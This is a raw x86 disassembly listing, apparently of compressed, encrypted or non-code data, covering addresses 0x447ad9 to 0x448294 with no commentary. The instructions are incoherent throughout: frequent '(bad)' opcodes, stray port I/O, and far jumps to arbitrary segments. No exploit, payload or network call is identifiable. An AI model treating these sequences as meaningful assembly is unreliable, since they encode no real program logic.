  447ad9:	jmp    0x447ad2
  447adb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  447adc:	mov    BYTE PTR [eax-0x31f0a0c1],bh
  447ae2:	ret    0x5b05
  447ae5:	xchg   edi,eax
  447ae6:	stos   BYTE PTR es:[edi],al
  447ae7:	nop
  447ae8:	mov    cl,BYTE PTR [ecx+0x4a]
  447aeb:	jmp    0x1631:0x2345989c
  447af2:	pop    ss
  447af3:	xchg   esp,eax
  447af4:	ja     0x447a9d
  447af6:	std    
  447af7:	rol    bh,1
  447af9:	inc    ebx
  447afa:	cmp    al,0xc5
  447afc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  447afd:	or     ebx,DWORD PTR [eax-0x45]
  447b00:	pop    eax
  447b01:	(bad)  
  447b02:	push   esi
  447b03:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  447b05:	leave  
  447b06:	inc    ebx
  447b07:	das    
  447b08:	mov    ah,0x58
  447b0a:	push   ds
  447b0b:	arpl   bx,di
  447b0d:	ja     0x447b00
  447b0f:	sti    
  447b10:	adc    al,0x59
  447b12:	pop    es
  447b13:	loop   0x447b88
  447b15:	inc    eax
  447b16:	mov    cl,0x60
  447b18:	fst    QWORD PTR [ecx]
  447b1a:	fbstp  TBYTE PTR [eax+0x19]
  447b1d:	clc    
  447b1e:	stos   BYTE PTR es:[edi],al
  447b1f:	mov    bl,ah
  447b21:	sbb    cl,BYTE PTR [eax-0x7e4c0e4b]
  447b27:	mov    esp,0x8e2be96c
  447b2c:	ja     0x447b8c
  447b2e:	cmc    
  447b2f:	jl     0x447ad7
  447b31:	ret    0x8c71
  447b34:	pop    esi
  447b35:	cli    
  447b36:	int    0xbb
  447b38:	mov    esi,0x1783dde0
  447b3d:	mov    dh,ah
  447b3f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  447b40:	mov    ds:0x417b29cc,eax
  447b45:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  447b46:	mov    ebx,0x3c788aff
  447b4b:	dec    edi
  447b4c:	adc    BYTE PTR [ebx+0xc8551eb],ah
  447b52:	popf   
  447b53:	ror    bl,1
  447b55:	add    al,BYTE PTR [ecx]
  447b57:	(bad)
  447b5b:	or     BYTE PTR [eax+0x77eb15b0],dl
  447b61:	push   edx
  447b62:	mov    dl,bh
  447b64:	call   0xa5f39372
  447b69:	aas    
  447b6a:	mov    ch,0x34
  447b6c:	mov    ecx,0x45360cc
  447b71:	call   0xcbbc:0xfad8b456
  447b78:	fld    TBYTE PTR [edx-0x4e]
  447b7b:	arpl   WORD PTR [esi+0x47],di
  447b7e:	pop    ds
  447b7f:	mov    ah,dh
  447b81:	test   DWORD PTR [esi+esi*4],ecx
  447b84:	mov    bh,0x18
  447b86:	or     esp,esi
  447b88:	pop    edx
  447b89:	jge    0x447b4f
  447b8b:	and    dh,BYTE PTR [esi]
  447b8d:	xchg   esi,eax
  447b8e:	inc    esp
  447b8f:	inc    ecx
  447b90:	xchg   ecx,eax
  447b91:	or     DWORD PTR [edx-0x60],ebx
  447b94:	cmp    eax,0x89f4665d
  447b99:	aam    0x82
  447b9b:	push   ds
  447b9c:	and    eax,0xa40840e4
  447ba1:	out    0x93,eax
  447ba3:	inc    ecx
  447ba5:	loopne 0x447b60
  447ba7:	jmp    0xf06906ad
  447bac:	shl    dh,cl
  447bae:	and    al,0xd2
  447bb0:	stos   DWORD PTR es:[edi],eax
  447bb1:	adc    DWORD PTR [ebx+0x55],esp
  447bb4:	imul   ebx,DWORD PTR [esi],0xd7d595a9
  447bba:	mov    cl,0xa1
  447bbc:	mov    ch,0xa7
  447bbe:	or     DWORD PTR [eax+0x3a],ecx
  447bc1:	push   edi
  447bc2:	dec    ecx
  447bc3:	test   BYTE PTR [ebx-0x30a20459],ah
  447bc9:	and    al,0x3a
  447bcb:	pop    ecx
  447bcc:	call   0xbadb9226
  447bd1:	mov    edi,0xc7f04011
  447bd6:	mov    WORD PTR [ecx-0x69],?
  447bd9:	lahf   
  447bda:	test   al,0x34
  447bdc:	out    dx,eax
  447bdd:	sahf   
  447bde:	repnz mov ds:0x86db3720,eax
  447be4:	imul   ebx,DWORD PTR [ebx+0x76],0x3cddc520
  447beb:	out    0x5f,al
  447bed:	jmp    0xf1ba:0xd664fe53
  447bf4:	retf   0x8b27
  447bf7:	in     eax,0xc1
  447bf9:	gs cld 
  447bfb:	int3   
  447bfc:	dec    ebx
  447bfd:	pop    es
  447bfe:	and    DWORD PTR gs:[ecx],esi
  447c01:	jnp    0x447c4b
  447c03:	add    DWORD PTR [ebx-0x64e314ad],eax
  447c09:	push   es
  447c0a:	push   eax
  447c0b:	clc    
  447c0c:	jb     0x447c59
  447c0e:	cmp    al,0x70
  447c10:	adc    al,0x81
  447c12:	shr    DWORD PTR [eax+0x5f],1
  447c15:	push   esp
  447c16:	mov    bh,0xa1
  447c18:	inc    edi
  447c19:	pop    ss
  447c1a:	jg     0x447ba7
  447c1c:	jge    0x447bf1
  447c1e:	mov    ecx,0xde35b6f0
  447c23:	pop    edx
  447c24:	retf   
  447c25:	dec    esp
  447c26:	mov    dh,0x8a
  447c28:	add    cl,BYTE PTR [esi]
  447c2a:	stos   DWORD PTR es:[edi],eax
  447c2b:	shl    dl,cl
  447c2d:	sbb    al,0x7
  447c2f:	js     0x447be5
  447c31:	and    al,0xc8
  447c33:	sbb    BYTE PTR [edi-0x77529fe],dh
  447c39:	fmul   QWORD PTR [eax+0x247d10d0]
  447c3f:	gs cli 
  447c41:	pop    ecx
  447c42:	cld    
  447c43:	lods   al,BYTE PTR ds:[esi]
  447c44:	mov    ds:0xc5e55b89,eax
  447c49:	jmp    0x3f0b:0x2d86dbbc
  447c50:	xchg   esp,eax
  447c51:	or     eax,0xd458c431
  447c56:	adc    ah,cl
  447c58:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  447c59:	mov    ecx,0xc670c886
  447c5e:	pop    ebp
  447c5f:	sub    DWORD PTR [ecx-0x6613281f],0xffffffbf
  447c66:	gs lock inc ecx
  447c69:	leave  
  447c6a:	xor    eax,0xe4820a7c
  447c6f:	cmc    
  447c70:	adc    BYTE PTR [esi+0x54c3b0f9],dh
  447c76:	sub    BYTE PTR [edi],bl
  447c78:	and    BYTE PTR [ebx+0xa],al
  447c7b:	sbb    al,0x66
  447c7d:	push   edx
  447c7e:	(bad)  
  447c7f:	mov    bh,0xde
  447c81:	inc    esi
  447c82:	inc    edi
  447c83:	and    al,0x32
  447c85:	adc    BYTE PTR [edx+0x6c],ah
  447c88:	add    BYTE PTR [eax-0x518bdcc0],0xf7
  447c8f:	test   eax,0xd8451a02
  447c94:	adc    al,0xaf
  447c96:	(bad)  
  447c97:	mul    BYTE PTR [edx]
  447c99:	stc    
  447c9a:	aas    
  447c9b:	adc    edx,esi
  447c9d:	lahf   
  447c9e:	daa    
  447c9f:	loop   0x447cf1
  447ca1:	mov    eax,ds:0x64bf2df5
  447ca6:	push   edx
  447ca7:	bound  ebp,QWORD PTR [edi]
  447ca9:	sahf   
  447caa:	pop    ss
  447cab:	adc    bl,BYTE PTR [esi-0x2c]
  447cae:	inc    edi
  447caf:	xor    BYTE PTR [ebx],ah
  447cb1:	push   ecx
  447cb2:	xchg   ecx,eax
  447cb3:	fdiv   DWORD PTR [eax]
  447cb5:	add    eax,0x244168e6
  447cba:	jns    0x447d0d
  447cbc:	pop    es
  447cbd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  447cbe:	cmp    BYTE PTR [ebp-0x13],bh
  447cc1:	popa   
  447cc2:	loope  0x447c51
  447cc4:	enter  0x3875,0xf0
  447cc8:	cmc    
  447cc9:	and    ecx,esi
  447ccb:	push   ebp
  447ccc:	inc    ecx
  447ccd:	aas    
  447cce:	pop    edx
  447ccf:	test   DWORD PTR [esi+0x7],edx
  447cd2:	xlat   BYTE PTR ds:[ebx]
  447cd3:	mov    DWORD PTR [edx-0x59],0xf0279b7
  447cda:	or     DWORD PTR [ecx-0x44],eax
  447cdd:	loopne 0x447ca2
  447cdf:	adc    eax,0x5fb42aad
  447ce4:	movsx  esi,ah
  447ce7:	inc    edi
  447ce8:	mov    BYTE PTR [esi+0x5f],dh
  447ceb:	pop    es
  447cec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  447ced:	pop    ecx
  447cee:	jl     0x447c91
  447cf0:	pop    esp
  447cf1:	xor    eax,0x8e4413d
  447cf6:	sub    al,0x14
  447cf8:	cmp    DWORD PTR [ecx-0x52],0x10
  447cfc:	ret    0xd3d8
  447cff:	repnz sub BYTE PTR [ecx-0x5fa83e61],bh
  447d06:	push   ebx
  447d07:	and    bl,BYTE PTR gs:[eax-0x5]
  447d0b:	sbb    ebx,DWORD PTR [ecx-0x57f5ee1]
  447d11:	into   
  447d12:	inc    edx
  447d13:	add    ebx,esp
  447d15:	mov    ds:0xc2a2d973,al
  447d1a:	xlat   BYTE PTR ds:[ebx]
  447d1b:	cmp    al,0xd9
  447d1d:	mov    dh,0x5f
  447d1f:	or     al,0xa9
  447d21:	xchg   ebp,eax
  447d22:	xchg   DWORD PTR [ebx-0x2539bc6e],edi
  447d28:	xor    BYTE PTR [edi+ecx*1+0x4e],0x26
  447d2d:	fld    QWORD PTR [esi-0x5]
  447d30:	icebp  
  447d31:	and    eax,0x861c2b2b
  447d36:	inc    edi
  447d37:	pop    ecx
  447d38:	(bad)  
  447d39:	and    BYTE PTR [eax+0x8403cf2],bh
  447d3f:	rcl    ebx,1
  447d41:	add    esi,DWORD PTR [ebx+0x46]
  447d44:	cmp    ah,BYTE PTR [ebx]
  447d46:	jnp    0x447d79
  447d48:	popa   
  447d49:	(bad)  
  447d4a:	inc    esi
  447d4b:	or     BYTE PTR [esi-0x45],ch
  447d4e:	jmp    0x2cdff6fc
  447d53:	sub    edi,DWORD PTR [eax]
  447d55:	mov    ebp,DWORD PTR [ecx]
  447d57:	ror    DWORD PTR [esi-0x6d],cl
  447d5a:	lea    ecx,[edx]
  447d5c:	xor    DWORD PTR [ecx],ebx
  447d5e:	gs push esi
  447d60:	and    eax,0x2f9419db
  447d65:	outs   dx,DWORD PTR ds:[esi]
  447d66:	ss jo  0x447d68
  447d69:	push   cs
  447d6a:	sbb    al,ah
  447d6c:	jp     0x447d27
  447d6e:	or     ah,BYTE PTR [ecx]
  447d70:	and    ecx,DWORD PTR [eax+ebx*8+0x65]
  447d74:	dec    esp
  447d75:	stc    
  447d76:	jae    0x447d27
  447d78:	mov    esi,0x457d38b6
  447d7d:	std    
  447d7e:	add    al,0xe0
  447d80:	inc    edi
  447d81:	adc    al,0xaa
  447d83:	mov    ch,0x6d
  447d85:	xor    eax,DWORD PTR [edi+0xc779259]
  447d8b:	adc    eax,0x4c49ecef
  447d90:	rcl    BYTE PTR [edx+0x2f],cl
  447d93:	daa    
  447d94:	cdq    
  447d95:	int    0x6f
  447d97:	inc    ebp
  447d98:	push   ecx
  447d99:	xchg   DWORD PTR [ebx-0xc4a99d3],esp
  447d9f:	add    dl,BYTE PTR [ebp-0x18fcfa7e]
  447da5:	xchg   edx,eax
  447da6:	add    edx,DWORD PTR [esp+ebp*1+0x37]
  447daa:	mov    eax,0xde230414
  447daf:	cdq    
  447db0:	push   0xc57d218c
  447db5:	adc    eax,0x7089b973
  447dba:	mov    ds:0x79efb3ea,eax
  447dbf:	(bad)  
  447dc0:	sbb    BYTE PTR [ecx-0x53],dh
  447dc3:	pusha  
  447dc4:	xor    ecx,DWORD PTR [ebp-0x4]
  447dc7:	lods   al,BYTE PTR ds:[esi]
  447dc8:	fadd   DWORD PTR [edx]
  447dca:	xchg   ebp,eax
  447dcb:	adc    DWORD PTR [ecx],ebx
  447dcd:	pop    ecx
  447dce:	xor    edi,ebp
  447dd0:	in     eax,0x1e
  447dd2:	ss inc esi
  447dd4:	push   0xffffff90
  447dd6:	fistp  QWORD PTR [edi-0x37]
  447dd9:	test   eax,0x6dc21271
  447dde:	xor    al,0xf7
  447de0:	mov    ebx,esp
  447de2:	jecxz  0x447dee
  447de4:	scas   al,BYTE PTR es:[edi]
  447de5:	(bad)  
  447de6:	neg    BYTE PTR [esi-0x46789e03]
  447dec:	cmp    eax,DWORD PTR [edx+0x4f3dc0fa]
  447df2:	mov    ebx,0xcb9c7482
  447df7:	rcr    DWORD PTR [eax+0x54be6cb3],1
  447dfd:	adc    eax,DWORD PTR [edi-0x5d]
  447e00:	pop    es
  447e01:	adc    BYTE PTR [eax-0x5d],0xc5
  447e05:	inc    bl
  447e07:	sbb    ah,BYTE PTR [eax-0x4bc63b43]
  447e0d:	cmp    bh,bh
  447e0f:	shl    BYTE PTR [ecx-0x2498eeb3],cl
  447e15:	pop    esi
  447e16:	add    DWORD PTR [edi-0x5a3def6d],edx
  447e1c:	or     al,0xdf
  447e1e:	inc    esp
  447e1f:	out    dx,al
  447e20:	stos   DWORD PTR es:[edi],eax
  447e21:	lods   al,BYTE PTR ds:[esi]
  447e22:	push   ecx
  447e23:	enter  0xd416,0xfd
  447e27:	mov    bl,0x0
  447e29:	jge    0x447e7f
  447e2b:	sub    eax,0xb800c89e
  447e30:	mov    dh,0xca
  447e32:	push   ebx
  447e33:	dec    esi
  447e34:	(bad)  
  447e35:	das    
  447e36:	adc    al,0x35
  447e38:	inc    ebx
  447e39:	inc    eax
  447e3a:	cld    
  447e3b:	lods   al,BYTE PTR ds:[esi]
  447e3c:	int    0x50
  447e3e:	fcom   QWORD PTR [eax-0x30fcb9eb]
  447e44:	push   ebx
  447e45:	mov    edx,0xf6a58ad8
  447e4a:	push   0xfda579b5
  447e4f:	(bad)  
  447e51:	lea    esi,[ebx+0x36199373]
  447e57:	ret    0x2f80
  447e5a:	cs push 0xb
  447e5d:	mov    ebx,0x4e662fe8
  447e62:	jl     0x447dfc
  447e64:	adc    eax,0x3dc1b913
  447e69:	xor    ebp,DWORD PTR [eax+0x3470e763]
  447e6f:	jle    0x447e3d
  447e71:	and    bl,BYTE PTR [esi+0xe4915b7]
  447e77:	jbe    0x447e63
  447e79:	or     sp,dx
  447e7c:	and    BYTE PTR [esi],cl
  447e7e:	ins    BYTE PTR es:[edi],dx
  447e7f:	emms   
  447e81:	mov    edi,0x972a24e5
  447e86:	shl    DWORD PTR [ecx-0x48],1
  447e89:	shr    DWORD PTR ds:0xedab01bc,1
  447e8f:	push   edi
  447e90:	adc    eax,0x16d1ce3f
  447e95:	pop    es
  447e96:	in     al,0xe
  447e98:	xchg   ebp,eax
  447e99:	sub    eax,0x1f22650f
  447e9e:	push   ebp
  447e9f:	cmp    eax,0x268110c5
  447ea4:	xchg   edi,eax
  447ea5:	ror    BYTE PTR [edx],0xf2
  447ea8:	(bad)  
  447eaa:	neg    BYTE PTR [eax+0x67dee14d]
  447eb0:	jmp    0x2b53a20f
  447eb5:	test   eax,0xa05274a
  447eba:	cmp    esp,DWORD PTR [ebx+0x6f485dcb]
  447ec0:	xor    eax,0x925fc5c4
  447ec5:	cmp    al,0x4
  447ec7:	cmp    BYTE PTR [ebp-0x2e],bl
  447eca:	loop   0x447f05
  447ecc:	add    eax,0x9c0d1327
  447ed1:	mov    edx,0xcb42f57f
  447ed6:	mov    WORD PTR [esi-0x1fd86939],ss
  447edc:	jge    0x447ed0
  447ede:	hlt    
  447edf:	jg     0x447f22
  447ee1:	sub    ch,BYTE PTR [ecx-0x57c18311]
  447ee7:	xchg   DWORD PTR ds:0xccabed76,ebx
  447eed:	popa   
  447eee:	icebp  
  447eef:	pushf  
  447ef0:	push   esi
  447ef1:	fs lock fs push cs
  447ef5:	cwde   
  447ef6:	and    BYTE PTR [ebx-0x71dc3251],al
  447efc:	(bad)  
  447efd:	xchg   ebx,eax
  447efe:	cmp    eax,0xfb5638ae
  447f03:	out    dx,al
  447f04:	dec    ebx
  447f05:	push   edi
  447f06:	push   ebp
  447f07:	cmp    eax,0xe3138d7b
  447f0c:	mov    DWORD PTR [edi+0x5b],ecx
  447f0f:	mov    ebp,0x3f873e68
  447f14:	ror    DWORD PTR [ecx],cl
  447f16:	pop    ebp
  447f17:	dec    edi
  447f18:	cs aad 0xe4
  447f1b:	pop    esp
  447f1c:	push   es
  447f1d:	mov    ebp,eax
  447f1f:	mov    bl,0xec
  447f21:	add    al,0x68
  447f23:	icebp  
  447f24:	fs xchg ebp,eax
  447f26:	lds    ebp,FWORD PTR [ecx+0x27]
  447f29:	loope  0x447f24
  447f2b:	push   ds
  447f2c:	or     dl,BYTE PTR [ecx+0x3c]
  447f2f:	push   0x686ca732
  447f34:	mov    eax,ds:0xfc63f2cb
  447f39:	lds    ebp,FWORD PTR [edi]
  447f3b:	int    0x67
  447f3d:	and    BYTE PTR [edi+ebx*2+0x6749113e],bh
  447f44:	sub    BYTE PTR [ecx-0x27],cl
  447f47:	imul   ecx,DWORD PTR [eax+eiz*1+0x2924be55],0x2d
  447f4f:	add    edi,edx
  447f51:	add    DWORD PTR [ecx],edx
  447f53:	pop    esp
  447f54:	jl     0x447f17
  447f56:	jp     0x447f0d
  447f58:	and    eax,0xc30c56b7
  447f5d:	mov    al,ds:0xb2f7318
  447f62:	push   ebp
  447f63:	sub    BYTE PTR [ecx+0x4bedd1e2],al
  447f69:	mov    al,0x9e
  447f6b:	cli    
  447f6c:	xor    ecx,esi
  447f6e:	xor    ebp,DWORD PTR [edx]
  447f70:	mov    WORD PTR [edx+0x20],es
  447f73:	mov    al,0x6f
  447f75:	sbb    DWORD PTR [edi],esi
  447f77:	je     0x447ff6
  447f79:	rol    BYTE PTR [eax],0x0
  447f7c:	in     eax,0x4
  447f7e:	adc    eax,0x86049d03
  447f83:	iret   
  447f84:	int3   
  447f85:	jo     0x447f99
  447f87:	(bad)  
  447f89:	imul   ebx,DWORD PTR [ebx],0x6a
  447f8c:	and    edx,DWORD PTR [ecx+0xec6162f]
  447f92:	jns    0x44800e
  447f94:	mov    esp,DWORD PTR [edx+0x3d]
  447f97:	mov    ah,dh
  447f99:	ja     0x447ffd
  447f9b:	in     al,0x2b
  447f9d:	push   eax
  447f9e:	and    DWORD PTR [ecx],edi
  447fa0:	shr    bl,1
  447fa2:	out    dx,eax
  447fa3:	and    al,0x69
  447fa5:	enter  0xd79a,0x66
  447fa9:	sub    ecx,ebp
  447fab:	pop    ebx
  447fac:	out    dx,al
  447fad:	sahf   
  447fae:	and    dl,dl
  447fb0:	or     eax,DWORD PTR [ecx]
  447fb2:	ret    
  447fb3:	push   edi
  447fb4:	inc    edx
  447fb5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  447fb6:	add    ebp,ebx
  447fb8:	mov    al,0x1e
  447fba:	xchg   esi,eax
  447fbb:	mov    WORD PTR [ebp+0x26],es
  447fbe:	fistp  WORD PTR ds:0x70d2aad4
  447fc4:	iret   
  447fc5:	in     eax,dx
  447fc6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  447fc7:	pop    edx
  447fc8:	mov    cl,0xbe
  447fca:	pop    ecx
  447fcb:	cmp    DWORD PTR [edi-0x71],ebx
  447fce:	test   BYTE PTR [edi-0x43],dh
  447fd1:	xchg   ecx,eax
  447fd2:	daa    
  447fd3:	mov    ah,0xc5
  447fd5:	sub    ebx,DWORD PTR [edi+0x28]
  447fd8:	jecxz  0x447fa4
  447fda:	scas   al,BYTE PTR es:[edi]
  447fdb:	fldcw  WORD PTR [ebp-0x71]
  447fde:	and    eax,DWORD PTR [eax+edx*2]
  447fe1:	push   0xffffffa9
  447fe3:	(bad)  
  447fe4:	push   ss
  447fe5:	jp     0x44804c
  447fe7:	fild   WORD PTR [esi-0x7f]
  447fea:	xor    eax,0x11093c9
  447fef:	or     eax,0xbefab634
  447ff4:	bound  eax,QWORD PTR [eax]
  447ff6:	mov    edx,0x7e465caa
  447ffb:	and    DWORD PTR [edi],eax
  447ffd:	xchg   edi,eax
  447ffe:	or     eax,0x70d4813b
  448003:	dec    ebp
  448004:	rcr    dl,cl
  448006:	mov    eax,ds:0x480d710
  44800b:	arpl   WORD PTR [ecx],si
  44800d:	in     al,dx
  44800e:	fiadd  DWORD PTR [ecx+0x1db07dff]
  448014:	xor    al,0x8f
  448016:	retf   0x3eca
  448019:	xchg   bh,bh
  44801b:	dec    edx
  44801c:	mov    cs,WORD PTR [esi+0x9972ccc]
  448022:	sahf   
  448023:	push   es
  448024:	pop    es
  448025:	pop    esi
  448026:	(bad)  
  448027:	jmp    0x674d:0x6cfec8f9
  44802e:	(bad)  
  44802f:	sub    ebp,ebx
  448031:	lahf   
  448032:	inc    ebp
  448033:	adc    al,BYTE PTR es:[edx-0x50]
  448037:	pop    eax
  448038:	bound  ecx,QWORD PTR [ecx]
  44803a:	rol    BYTE PTR [ecx-0x5b01b0e5],0x45
  448041:	je     0x448086
  448043:	xchg   ecx,eax
  448044:	sub    al,0xf
  448046:	inc    ebx
  448047:	push   es
  448048:	cmp    ah,BYTE PTR [esi]
  44804a:	(bad)  
  44804b:	jae    0x448043
  44804d:	test   esi,0x6f46605d
  448053:	dec    edx
  448054:	jae    0x44805e
  448056:	jecxz  0x448012
  448058:	jmp    0x448022
  44805a:	inc    edi
  44805b:	xchg   edx,eax
  44805c:	mov    BYTE PTR [edx+0x55],dh
  44805f:	sub    BYTE PTR [edx-0x77],cl
  448062:	add    al,0x3c
  448064:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  448065:	push   0x5
  448067:	sbb    edi,DWORD PTR [ebp+0x4c]
  44806a:	(bad)  
  44806b:	outs   dx,BYTE PTR ds:[esi]
  44806c:	cmp    dl,BYTE PTR [eax]
  44806e:	sub    BYTE PTR [edx+0x28fd7df6],ah
  448074:	dec    ecx
  448075:	test   al,0xbb
  448077:	enter  0x55b0,0x72
  44807b:	in     al,0x43
  44807d:	scas   eax,DWORD PTR es:[edi]
  44807e:	int    0x32
  448080:	loope  0x4480f6
  448082:	pop    eax
  448083:	fidivr WORD PTR [edi-0xbc724de]
  448089:	jmp    0xa71b1b3c
  44808e:	jno    0x448108
  448090:	sar    DWORD PTR [ebp+0x5c714836],cl
  448096:	cmp    BYTE PTR [ebx-0x6e],0x69
  44809a:	and    eax,0xc163193f
  44809f:	outs   dx,BYTE PTR ds:[esi]
  4480a0:	sbb    esi,edx
  4480a2:	ins    BYTE PTR es:[edi],dx
  4480a3:	add    al,0x90
  4480a5:	in     al,dx
  4480a6:	dec    ebp
  4480a7:	data16 jg 0x44810f
  4480aa:	or     eax,0xb39a6398
  4480af:	dec    ebx
  4480b0:	jmp    0x904b030d
  4480b5:	sahf   
  4480b6:	xlat   BYTE PTR ds:[ebx]
  4480b7:	das    
  4480b8:	dec    eax
  4480b9:	mov    ds:0xc3c0eb4e,eax
  4480be:	(bad)  
  4480bf:	mov    al,ds:0x570f7428
  4480c4:	mov    gs:0xedabc556,eax
  4480ca:	dec    ecx
  4480cb:	xchg   esp,eax
  4480cc:	pop    ebx
  4480cd:	mov    ds:0xa3dcfbe8,al
  4480d2:	xlat   BYTE PTR ds:[ebx]
  4480d3:	test   BYTE PTR [bx+si-0x7d],ch
  4480d7:	pop    ds
  4480d8:	xchg   ebx,eax
  4480d9:	pushf  
  4480da:	cmp    ebp,eax
  4480dc:	retf   0x9b54
  4480df:	and    DWORD PTR [esi+ebp*8-0x64],esi
  4480e3:	js     0x4480df
  4480e5:	aas    
  4480e6:	jae    0x448075
  4480e8:	sub    ebp,DWORD PTR [ebx]
  4480ea:	and    ah,BYTE PTR ds:0x1f19e979
  4480f0:	je     0x44809f
  4480f2:	clc    
  4480f3:	neg    BYTE PTR [edx]
  4480f5:	nop
  4480f6:	jle    0x4480d0
  4480f8:	mov    cl,0x50
  4480fa:	push   0xa
  4480fc:	jp     0x4480c7
  4480fe:	push   esi
  4480ff:	xchg   ebp,eax
  448100:	or     eax,DWORD PTR [ecx-0x54e412e8]
  448106:	in     eax,dx
  448107:	pushf  
  448108:	loopne 0x448154
  44810a:	pop    ss
  44810b:	cld    
  44810c:	shl    DWORD PTR [esi-0x45fb2646],cl
  448112:	push   esi
  448113:	xchg   ebp,eax
  448114:	dec    esi
  448115:	shl    eax,0x92
  448118:	jp     0x448193
  44811a:	dec    edx
  44811b:	mov    eax,0x57813f9b
  448120:	aam    0xd3
  448122:	sub    eax,0xa6e685ff
  448127:	xor    eax,ebx
  448129:	and    BYTE PTR [edi+0x44],bh
  44812c:	(bad)  
  44812d:	fisttp DWORD PTR [edi]
  44812f:	fcmovb st,st(6)
  448131:	rcr    ebp,0x63
  448134:	lods   eax,DWORD PTR ds:[esi]
  448135:	pop    ss
  448136:	mov    bl,0x54
  448138:	dec    esi
  448139:	(bad)
  44813c:	or     cl,al
  44813e:	inc    ebx
  44813f:	push   cs
  448140:	xchg   ebx,eax
  448141:	xchg   BYTE PTR [esi-0x6e4e6377],dh
  448147:	sbb    BYTE PTR [eax],bh
  448149:	mov    bh,0x9a
  44814b:	retf   
  44814c:	jns    0x4480e9
  44814e:	mov    ds:0x8e66bcc3,al
  448153:	imul   edi,ebp,0xffffffba
  448156:	inc    edi
  448157:	rol    ebx,cl
  448159:	(bad)  
  44815a:	fnsave [ecx]
  44815c:	or     al,0x88
  44815e:	and    bl,BYTE PTR [ecx-0x1f]
  448161:	out    0x68,eax
  448163:	add    esp,DWORD PTR [ebx]
  448165:	(bad)  
  448166:	jbe    0x448116
  448168:	inc    esp
  448169:	cld    
  44816a:	or     BYTE PTR [eax-0x37],dl
  44816d:	popw   ds
  44816f:	rcr    dh,0xf0
  448172:	aaa    
  448173:	rcl    DWORD PTR [esi],cl
  448175:	mov    WORD PTR [edx-0x2],bp
  448179:	ja     0x4481ef
  44817b:	stos   DWORD PTR es:[edi],eax
  44817c:	repz pop ds
  44817e:	jge    0x448124
  448180:	pop    ds
  448181:	shl    BYTE PTR [esi+0x62ac28b4],0x88
  448188:	push   0x54
  44818a:	shr    DWORD PTR [edx+0x3fc97f3b],cl
  448190:	sub    dh,ah
  448192:	ror    eax,cl
  448194:	jae    0x4481af
  448196:	push   esi
  448197:	or     bh,BYTE PTR ds:0xbd06037f
  44819d:	bound  eax,QWORD PTR [ecx+0x1a6daeb0]
  4481a3:	sti    
  4481a4:	test   eax,0xcaadbebd
  4481a9:	cmp    DWORD PTR [ecx+edi*4-0x40],edi
  4481ad:	in     al,dx
  4481ae:	lds    ebx,FWORD PTR [ebx-0x39]
  4481b1:	dec    esp
  4481b2:	call   0xbc8b:0x16a764a5
  4481b9:	nop
  4481ba:	in     al,dx
  4481bb:	(bad)  
  4481bc:	mov    ds:0x213c40e3,al
  4481c1:	(bad)  
  4481c2:	xlat   BYTE PTR ds:[ebx]
  4481c3:	cmp    al,0x7d
  4481c5:	cmp    al,0x4c
  4481c7:	pop    esp
  4481c8:	(bad)  
  4481c9:	out    0x5c,al
  4481cb:	mov    ebp,0xb3d90c59
  4481d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4481d1:	adc    bh,BYTE PTR [esi-0x20d911cc]
  4481d7:	leave  
  4481d8:	inc    ebp
  4481d9:	pop    ecx
  4481da:	xchg   esi,eax
  4481db:	mov    ebp,0x5619f7c3
  4481e0:	pop    esp
  4481e1:	or     DWORD PTR ds:[ebx+0x2],edx
  4481e5:	and    ebx,DWORD PTR [eax+0x13]
  4481e8:	popf   
  4481e9:	arpl   WORD PTR [esi],bx
  4481eb:	xor    BYTE PTR [eax+0x9],ah
  4481ee:	out    dx,al
  4481ef:	inc    esi
  4481f0:	out    0x42,eax
  4481f2:	lock cmp ah,BYTE PTR [ecx+0x51]
  4481f6:	or     eax,0x1396e47a
  4481fb:	imul   esi,DWORD PTR [ecx],0xb682bf2a
  448201:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  448202:	test   BYTE PTR [ebp+0x419091d0],ah
  448208:	(bad)  
  448209:	mov    ah,0x60
  44820b:	mov    dh,0x9d
  44820d:	std    
  44820e:	or     dh,ch
  448210:	pop    ebp
  448211:	loope  0x448271
  448213:	js     0x4481b0
  448215:	repnz inc ecx
  448217:	fcom   DWORD PTR [edx+ebx*1-0x4a2a1043]
  44821e:	or     eax,0xe35fbff5
  448223:	mov    al,0x41
  448225:	mov    ds:0x2bab91cf,eax
  44822a:	sub    esi,esp
  44822c:	(bad)  [ebx+ebp*4+0x12950210]
  448233:	daa    
  448234:	loopne 0x448284
  448236:	aad    0x4
  448238:	sbb    BYTE PTR cs:[ebx+0x524acdbc],ah
  44823f:	ds dec esi
  448241:	retf   
  448242:	in     al,0xa3
  448244:	nop
  448245:	jg     0x44821e
  448247:	rcr    BYTE PTR [esi+0x40e9a194],1
  44824d:	xchg   ebx,eax
  44824e:	add    dh,cl
  448250:	ret    0xf56c
  448253:	(bad)  
  448254:	jp     0x448285
  448256:	retf   
  448257:	fmulp  st(5),st
  448259:	mov    al,0x29
  44825b:	adc    DWORD PTR [ebx+edi*2+0x7264ce5b],0x2739ad2f
  448266:	mov    ch,0x5e
  448268:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  448269:	repnz in eax,0xb1
  44826c:	xor    BYTE PTR [ecx+0xf20754d],cl
  448272:	in     al,0x47
  448274:	jp     0x448236
  448276:	add    dl,bl
  448278:	jo     0x4482ba
  44827a:	clc    
  44827b:	push   cs
  44827c:	push   es
  44827d:	pslld  mm4,QWORD PTR [ebp+0x55]
  448281:	in     al,0x61
  448283:	ret    0x1bce
  448286:	aad    0xe7
  448288:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  448289:	stos   DWORD PTR es:[edi],eax
  44828a:	ja     0x44826b
  44828c:	test   DWORD PTR [edi-0x6f],ebp
  44828f:	or     ebx,edi
  448291:	add    ch,bl
  448293:	pusha  
  448294:	jne    0x448286
